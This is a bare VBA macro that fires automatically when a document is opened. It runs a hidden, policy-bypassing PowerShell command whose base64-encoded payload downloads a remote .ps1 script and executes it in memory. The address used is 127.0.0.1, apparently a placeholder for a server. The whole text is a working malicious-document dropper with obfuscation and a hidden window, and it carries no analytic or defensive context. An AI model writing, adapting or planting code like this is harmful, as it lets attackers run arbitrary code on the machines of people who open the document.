Sub Document_Open()
Dim strCommand As String
strCommand = "powershell.exe -Exec Bypass -NoL -Nop -Win hidden -Enc aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwB3AHcAdwAvAGwAaQBuAGsALwBwAG4AdAAuAHAAcwAxACcAKQApAA=="
Shell strCommand, 0
End Sub
